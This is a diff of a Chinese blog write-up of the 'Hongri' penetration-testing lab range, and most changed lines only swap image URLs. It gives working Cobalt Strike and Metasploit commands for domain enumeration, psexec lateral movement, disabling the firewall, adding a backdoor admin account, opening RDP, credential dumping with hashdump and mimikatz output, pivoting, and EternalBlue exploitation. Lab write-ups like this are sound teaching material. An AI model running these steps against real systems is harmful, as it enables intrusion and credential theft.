-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508231828984.png" alt="image-20240508231828984"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737550.png" alt="image-20240508231828984"></p>
 <p>我们可以先确定一下域控和其他域用户</p>
 <p><strong>判断域环境</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net config workstation<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508232032749.png" alt="image-20240508232032749"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737551.png" alt="image-20240508232032749"></p>
 <p><strong>判断域用户</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net user /domain<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508232158760.png" alt="image-20240508232158760"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737552.png" alt="image-20240508232158760"></p>
 <p><strong>判断域控</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Controllers&quot; /domain<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508232406793.png" alt="image-20240508232406793"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737553.png" alt="image-20240508232406793"></p>
 <p>确定了域控的主机为<code>OWA$</code>，可以ping一下看能不能通</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508232935606.png" alt="image-20240508232935606"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737554.png" alt="image-20240508232935606"></p>
 <p>利用<code>net time</code>也可以定位域控，这里就不演示了</p>
 <p><strong>看一下域管理员</strong></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">shell net group &quot;Domain Admins&quot; /domain<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508233119937.png" alt="image-20240508233119937"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737555.png" alt="image-20240508233119937"></p>
 <p><strong>横向移动</strong></p>
 <p>直接输入<code>net view</code>命令可以探测到其他的域主机</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508233307337.png" alt="image-20240508233307337"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508233320930.png" alt="image-20240508233320930"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737556.png" alt="image-20240508233307337"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737557.png" alt="image-20240508233320930"></p>
 <p>点击上图的地方列出我们刚刚扫描出来的内网主机，右击选择jump&#x3D;》psexec去登陆一下尝试，密码就是我们改过的这个<code>Hongrisec@2019</code>，因为密码一般都是由域控管理的，所以一般都是一样的，所以win7这台靶机其实也应该改成这个密码才对。</p>
 <p>然后这里就可以直接一把梭了其实，直接用当前主机的凭据去用psexec横向移动即可，因为凭据都是一样的，然后监听器也选择那个反向shell的http监听器</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508234256791.png" alt="image-20240508234256791"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737558.png" alt="image-20240508234256791"></p>
 <p>两台主机都这样选择，然后等待回连即可</p>
 <p>emmm很尴尬只上线了一台域控，另一台域成员反而没上线很奇怪</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240508235438343.png" alt="image-20240508235438343"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737559.png" alt="image-20240508235438343"></p>
 <p>后来先建立了smb监听就可以进行psexec横向移动了，增加一个smb监听器即可</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240517224609304.png" alt="image-20240517224609304"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240517224625150.png" alt="image-20240517224625150"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737560.png" alt="image-20240517224609304"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737561.png" alt="image-20240517224625150"></p>
 <p>接下来用MSF的打法，学学其他东西</p>
 <p><strong>关闭防火墙、添加管理员账户</strong></p>
 <p>这里一开始上线应该顺手创立管理员用户然后关闭防火墙的，补一下:</p>
 <p>还要开3389用于远程连接</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">netsh advfirewall <span class="hljs-built_in">set</span> allprofiles state off <span class="hljs-comment">#win关闭防火墙</span><br>net user clown 123qwe@2024 /add   <span class="hljs-comment">#添加账户密码</span><br>net localgroup administrators clown <span class="hljs-comment">#添加为管理员权限</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#开启3389端口</span><br>REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 11111111 /f <span class="hljs-comment">#关闭3389</span><br></code></pre></td></tr></table></figure>
 
-<h1 id="MSF渗透打法"><a href="#MSF渗透打法" class="headerlink" title="MSF渗透打法"></a>MSF渗透打法</h1><h2 id="CS联动MSF"><a href="#CS联动MSF" class="headerlink" title="CS联动MSF"></a>CS联动MSF</h2><p>这里就不重新用MSF来拿shell了</p>
+<h1><span id="msf渗透打法">MSF渗透打法</span></h1><h2><span id="cs联动msf">CS联动MSF</span></h2><p>这里就不重新用MSF来拿shell了</p>
 <p>我们可以CS开启一个新监听，然后msf开启监听，将session转移到msf上面</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240517232416545.png" alt="image-20240517232416545"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240517232757549.png" alt="image-20240517232757549"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737562.png" alt="image-20240517232416545"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737563.png" alt="image-20240517232757549"></p>
 <p>MSF:</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use exploit/multi/handler<br><span class="hljs-built_in">set</span> payload windows/meterpreter/reverse_http <span class="hljs-comment">#一定要注意payload是http不是tcp，一开始用了tcp一直连不上</span><br><span class="hljs-built_in">set</span> lhost 192.168.20.128<br><span class="hljs-built_in">set</span> lport 6666<br>exploit<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518001337395.png" alt="image-20240518001337395"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737564.png" alt="image-20240518001337395"></p>
 <p><strong>也可以MSF派生会话给cs</strong></p>
 <p>这里记录流程就不试了</p>
 <p>首先msf中已有会话session1</p>
@@ -337,35 +338,35 @@
 <p>因为meterpreter会话不太稳定，上线后可以做一个进程迁移，参考文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/weixin_44023693/article/details/104925099">https://blog.csdn.net/weixin_44023693/article/details/104925099</a></p>
 <ol>
 <li><p>先ps获取目标主机的进程</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518001528797.png" alt="image-20240518001528797"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737565.png" alt="image-20240518001528797"></p>
 </li>
 <li><p>getpid查看自己的进程号</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518001555284.png" alt="image-20240518001555284"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737566.png" alt="image-20240518001555284"></p>
 </li>
 <li><p>利用migrate迁移到稳定的进程，可以选择svchost.exe或者explorer.exe，这里用explorer.exe</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">migrate 1452<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518002212153.png" alt="image-20240518002212153"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737567.png" alt="image-20240518002212153"></p>
 <p>也可以用自动迁移进程的命令：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/manage/migrate<br></code></pre></td></tr></table></figure></li>
 </ol>
 <blockquote>
 <p>迁移也会窃取到对应用户的令牌</p>
 </blockquote>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518004001288.png" alt="image-20240518004001288"></p>
-<h2 id="MSF横向移动"><a href="#MSF横向移动" class="headerlink" title="MSF横向移动"></a>MSF横向移动</h2><p>这里可以先抓取一下本地用户的明文密码或者哈希，待会psexec横向移动的时候会用到</p>
+<p><img src="http://cdn.clown2024.cn/202407151737568.png" alt="image-20240518004001288"></p>
+<h2><span id="msf横向移动">MSF横向移动</span></h2><p>这里可以先抓取一下本地用户的明文密码或者哈希，待会psexec横向移动的时候会用到</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">hashdump<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518004658364.png" alt="image-20240518004658364"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737569.png" alt="image-20240518004658364"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>clown:1005:aad3b435b51404eeaad3b435b51404ee:d42bd392b52fdac4b29d5cdf59cff276:::<br>Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br>liukaifeng01:1000:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::<br></code></pre></td></tr></table></figure>
 
 <p>然后使用kiwi模块，mimikatz已经集成在里面了</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use kiwi<br><span class="hljs-built_in">help</span> <span class="hljs-comment">#查看命令</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518004846544.png" alt="image-20240518004846544"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737570.png" alt="image-20240518004846544"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">getsystem  <span class="hljs-comment">#提权</span><br>creds_all  <span class="hljs-comment">#获取所有凭据</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518005050479.png" alt="image-20240518005050479"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737571.png" alt="image-20240518005050479"></p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">Administrator  GOD     Hongrisec@2019<br></code></pre></td></tr></table></figure>
 
 <p><strong>进入终端</strong></p>
@@ -374,41 +375,41 @@
 <p><strong>查看域内主机</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">chcp 65001  <span class="hljs-comment">#改变编码，不然会乱码</span><br>net view<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518005427752.png" alt="image-20240518005427752"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737572.png" alt="image-20240518005427752"></p>
 <p><strong>查看是否为蜜罐</strong></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run post/windows/gather/checkvm <span class="hljs-comment">#查看是否为虚拟机(蜜罐)</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518011240458.png" alt="image-20240518011240458"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737573.png" alt="image-20240518011240458"></p>
 <p><strong>添加路由转发</strong></p>
 <p>路由转发的具体作用参考这篇文章：<a target="_blank" rel="noopener" href="https://www.anquanke.com/post/id/86505">https://www.anquanke.com/post/id/86505</a></p>
 <p>大概作用就是利用该主机作为跳板机，在MSF平台上添加去往内网网段的路由</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">run autoroute -h  <span class="hljs-comment">#查看路由添加帮助</span><br>run get_local_subnets  <span class="hljs-comment">#查看主机所处的所有网段</span><br>run autoroute -s 192.168.52.0/24 <span class="hljs-comment">#添加去往目标网段的路由</span><br><br>run post/multi/manage/autoroute <span class="hljs-comment">#自动添加路由</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518011451547.png" alt="image-20240518011451547"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518011507107.png" alt="image-20240518011507107"></p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518011553537.png" alt="image-20240518011553537"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737574.png" alt="image-20240518011451547"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737575.png" alt="image-20240518011507107"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737576.png" alt="image-20240518011553537"></p>
 <p><strong>继续渗透</strong></p>
 <p>路由打通后就需要将会话放到后台然后进行其他攻击操作</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background<br>sessions -i<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518011730502.png" alt="image-20240518011730502"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737577.png" alt="image-20240518011730502"></p>
 <p>接下来就可以进行端口扫描</p>
 <p>先进行局部端口扫描</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">background                                      <br>use auxiliary/scanner/portscan/tcp <br><span class="hljs-built_in">set</span> rhosts 192.168.52.141 192.168.52.138  <span class="hljs-comment">#可以对一整网段也行，具体的主机ip可以从上面的ping主机名获取</span><br><span class="hljs-built_in">set</span> ports 80,135-139,445,3306,3389<br>run<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518012512080.png" alt="image-20240518012512080"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737578.png" alt="image-20240518012512080"></p>
 <p>可以先尝试一下永恒之蓝</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use auxiliary/scanner/smb/smb_ms17_010<br><span class="hljs-built_in">set</span> rhosts 192.168.52.0/24<br><span class="hljs-built_in">set</span> threads 50<br>run<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518012240761.png" alt="image-20240518012240761"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737579.png" alt="image-20240518012240761"></p>
 <p>然后尝试用永恒之蓝攻击拿shell</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">search ms17-010<br></code></pre></td></tr></table></figure>
 
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518014204665.png" alt="image-20240518014204665"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737580.png" alt="image-20240518014204665"></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 0<br><span class="hljs-built_in">set</span> RHOSTS 192.168.52.138 <span class="hljs-comment">#192.168.52.141是32位的，这个模块只能打64位的机器</span><br>run<br></code></pre></td></tr></table></figure>
 
 <p>额服了138也打不通很怪，一直报这个错误</p>
-<p><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/image-20240518023451960.png" alt="image-20240518023451960"></p>
+<p><img src="http://cdn.clown2024.cn/202407151737581.png" alt="image-20240518023451960"></p>
 <p>但是用另一个只能执行一条命令模块能成功，所以还有另一种思路，就是先将三台主机的3389开启之后，先连上第一台Windows7的远程，再连另外两台</p>
 <p>另一模块的使用如下：</p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash">use 2<br><span class="hljs-built_in">set</span> rhosts 192.168.52.138 <span class="hljs-comment">#目的地址</span><br><span class="hljs-built_in">set</span> <span class="hljs-built_in">command</span> REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal<span class="hljs-string">&quot; &quot;</span>Server /v fDenyTSConnections /t REG_DWORD /d 00000000 /f <span class="hljs-comment">#设置开启3389的命令</span><br>run<br></code></pre></td></tr></table></figure>
@@ -420,4 +421,4 @@
 <p>上面的路由只能msf访问，想要其他应用访问还要设置socks代理，参考这篇文章：<a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_44159028/article/details/124631522">https://blog.csdn.net/qq_44159028/article/details/124631522</a></p>
 <figure class="highlight bash"><table><tr><td class="code"><pre><code class="hljs bash"><span class="hljs-built_in">set</span> Proxies socks5:127.0.0.1:8989<br><span class="hljs-built_in">set</span> ReverseAllowProxy <span class="hljs-literal">true</span><br></code></pre></td></tr></table></figure>
 
-</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">https://clowsman.github.io/2024/05/02/红日靶场-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a></div><div class="post_share"><div class="social-share" data-image="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc@1.1.3/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="prev-post pull-left"><a href="/2024/05/10/Struts2%E6%BC%8F%E6%B4%9E%E5%AD%A6%E4%B9%A0/" title="Struts2漏洞学习"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015019.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of previous post"><div class="pagination-info"><div class="label">上一篇</div><div class="prev_info">Struts2漏洞学习</div></div></a></div><div class="next-post pull-right"><a href="/2024/04/29/%E5%B8%B8%E8%A7%81webshell%E6%B5%81%E9%87%8F%E5%88%86%E6%9E%90/" title="常见webshell流量分析"><img class="cover" src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">常见webshell流量分析</div></div></a></div></nav></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/8591fe993ff61c3b8ac9be3d6c12e7f.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">clown</div><div class="author-info__description">又菜又爱玩</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">49</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">26</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">24</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/clowsman"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/clowsman" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">This is my Blog</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#%E9%9D%B6%E5%9C%BA%E8%AF%B4%E6%98%8E"><span class="toc-number">1.</span> <span class="toc-text">靶场说明</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#%E7%8E%AF%E5%A2%83%E9%85%8D%E7%BD%AE"><span class="toc-number">1.1.</span> <span class="toc-text">环境配置</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web%E9%A1%B5%E9%9D%A2%E6%B8%97%E9%80%8F"><span class="toc-number">2.</span> <span class="toc-text">Web页面渗透</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#php%E6%8E%A2%E9%92%88"><span class="toc-number">2.1.</span> <span class="toc-text">php探针</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#%E5%85%B6%E4%BB%96%E9%A1%B5%E9%9D%A2"><span class="toc-number">2.2.</span> <span class="toc-text">其他页面</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#phpmyadmin%E5%90%8E%E5%8F%B0getshell"><span class="toc-number">2.3.</span> <span class="toc-text">phpmyadmin后台getshell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#yxcms"><span class="toc-number">2.4.</span> <span class="toc-text">yxcms</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#CS%E6%89%93%E6%B3%95"><span class="toc-number">3.</span> <span class="toc-text">CS打法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E9%83%A8%E7%BD%B2"><span class="toc-number">3.1.</span> <span class="toc-text">cs部署</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#cs%E4%B8%8A%E7%BA%BF%E9%9D%B6%E6%9C%BA"><span class="toc-number">3.2.</span> <span class="toc-text">cs上线靶机</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#MSF%E6%B8%97%E9%80%8F%E6%89%93%E6%B3%95"><span class="toc-number">4.</span> <span class="toc-text">MSF渗透打法</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#CS%E8%81%94%E5%8A%A8MSF"><span class="toc-number">4.1.</span> <span class="toc-text">CS联动MSF</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#MSF%E6%A8%AA%E5%90%91%E7%A7%BB%E5%8A%A8"><span class="toc-number">4.2.</span> <span class="toc-text">MSF横向移动</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="Linux提权-信息搜集"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015041.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Linux提权-信息搜集"/></a><div class="content"><a class="title" href="/2024/06/25/Linux%E6%8F%90%E6%9D%83-%E4%BF%A1%E6%81%AF%E6%90%9C%E9%9B%86/" title="Linux提权-信息搜集">Linux提权-信息搜集</a><time datetime="2024-06-25T11:30:08.000Z" title="发表于 2024-06-25 19:30:08">2024-06-25</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="红日靶场二"/></a><div class="content"><a class="title" href="/2024/06/22/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA%E4%BA%8C/" title="红日靶场二">红日靶场二</a><time datetime="2024-06-22T09:29:33.000Z" title="发表于 2024-06-22 17:29:33">2024-06-22</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/15/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240405015048.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="RMI反序列化"/></a><div class="content"><a class="title" href="/2024/06/15/RMI%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="RMI反序列化">RMI反序列化</a><time datetime="2024-06-15T09:03:33.000Z" title="发表于 2024-06-15 17:03:33">2024-06-15</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Shiro反序列化"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329155057.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Shiro反序列化"/></a><div class="content"><a class="title" href="/2024/06/11/Shiro%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="Shiro反序列化">Shiro反序列化</a><time datetime="2024-06-11T12:17:23.000Z" title="发表于 2024-06-11 20:17:23">2024-06-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习"><img src="https://cdn.jsdelivr.net/gh/clowsman/image@main/微信图片_20240329154902.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="ASM学习"/></a><div class="content"><a class="title" href="/2024/06/10/ASM%E5%AD%A6%E4%B9%A0/" title="ASM学习">ASM学习</a><time datetime="2024-06-10T13:39:52.000Z" title="发表于 2024-06-10 21:39:52">2024-06-10</time></div></div></div></div></div></div></main><footer id="footer"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By clown</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="回到顶部"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js?v=4.13.0"></script><script src="/js/main.js?v=4.13.0"></script><script src="https://cdn.jsdelivr.net/npm/@fancyapps/ui@5.0.33/dist/fancybox/fancybox.umd.min.js"></script><div class="js-pjax"></div><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script><div id="local-search"><div class="search-dialog"><nav class="search-nav"><span class="search-dialog-title">搜索</span><span id="loading-status"></span><button class="search-close-button"><i class="fas fa-times"></i></button></nav><div class="is-center" id="loading-database"><i class="fas fa-spinner fa-pulse"></i><span>  数据库加载中</span></div><div class="search-wrap"><div id="local-search-input"><div class="local-search-box"><input class="local-search-box--input" placeholder="搜索文章" type="text"/></div></div><hr/><div id="local-search-results"></div><div id="local-search-stats-wrap"></div></div></div><div id="search-mask"></div><script src="/js/search/local-search.js?v=4.13.0"></script></div></div><script src="/live2dw/lib/L2Dwidget.min.js?094cbace49a39548bed64abff5988b05"></script><script>L2Dwidget.init({"pluginRootPath":"live2dw/","pluginJsPath":"lib/","pluginModelPath":"assets/","tagMode":false,"debug":false,"model":{"jsonPath":"/live2dw/assets/shizuku.model.json"},"display":{"position":"left","width":150,"height":300},"mobile":{"show":true},"react":{"opacity":0.7},"log":false});</script></body></html>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>文章作者: </span><span class="post-copyright-info"><a href="https://clowsman.github.io">clown</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>文章链接: </span><span class="post-copyright-info"><a href="https://clowsman.github.io/2024/05/02/%E7%BA%A2%E6%97%A5%E9%9D%B6%E5%9C%BA-1/">https://clowsman.github.io/2024/05/02/红日靶场-1/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://clowsman.github.io" target="_blank">clown</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/%E6%B8%97%E9%80%8F%E9%9D%B6%E5%9C%BA/">渗透靶场</a></div><div class="post_share"><div class="social-share" data-image="http://cdn.clown2024.cn/202407151814121.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" 